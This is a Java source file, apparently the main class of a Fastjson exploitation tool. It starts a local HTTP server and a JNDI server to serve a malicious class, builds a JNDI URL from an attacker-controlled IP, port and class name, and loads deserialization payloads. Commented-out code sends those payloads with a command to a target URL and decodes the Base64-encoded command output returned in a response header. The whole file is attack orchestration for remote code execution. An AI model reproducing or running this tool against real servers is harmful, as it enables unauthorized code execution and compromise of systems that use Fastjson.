package com.fastjsontool.exploit;

import com.fastjsontool.exploit.JNDI.StartJNDI;
import com.fastjsontool.exploit.Utils.IPUtils;
import com.fastjsontool.exploit.Utils.ParamUtils;
import com.fastjsontool.exploit.httpServer.StartServer;
import com.fastjsontool.exploit.payload.Payload;
import com.fastjsontool.exploit.request.HTTPRequest;
import org.apache.http.Header;
import org.apache.http.client.methods.CloseableHttpResponse;
import sun.tools.jar.CommandLine;

import java.util.ArrayList;
import java.util.Base64;

/**
 * 工具主类
 * 1.开启简易的http服务
 * 2.开启服务
 * 3.发送payload
 */
public class Main {
    public static void main(String[] args) {
        //首先对参数进行处理
        ParamUtils.parseCommandLine(args);

        /**
         * 开启http服务
         */
        String module = Payload.getModule(Info.cmd);
        StartServer alibaba = new StartServer(module);
        alibaba.run();  //开启HTTP服务

        String format = String.format(Info.JNDIURL, Info.type, Info.ipaddr, Info.port, Info.className);
        /**
         * 开启JNDI服务
         */
        StartJNDI startJNDI = new StartJNDI();
        startJNDI.run();

        /**
         * 开始进行payload探测
         */
        HTTPRequest httpRequest = new HTTPRequest();

        ArrayList<String> payloads = Payload.getPayload(format);

        boolean flag=false;
        for (String s:payloads) {
            System.out.println(s);
            /*CloseableHttpResponse response = httpRequest.sendJson(Info.url, s,Info.cmd_);
            Header[] allHeaders = response.getAllHeaders();
            for (Header header: allHeaders) {
                if(header.getName().equals("informations")){
                    String value = header.getValue();
                    if(value.equals("fastjson") || value.equals("execError")){  //相当于payload探测功能
                        System.out.println("payload"+s+"可用,但命令执行失败！");
                    }else{
                        byte[] decode = Base64.getDecoder().decode(value);
                        System.out.println(new String(decode));
                        flag=true;
                    }
                    break;
                }
            }
            if(flag){
                break;
            }*/
        }
        if(!Info.pause){
            System.exit(0);
        }
        /*try {
            Thread.currentThread().sleep(1000000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }*/
    }

}
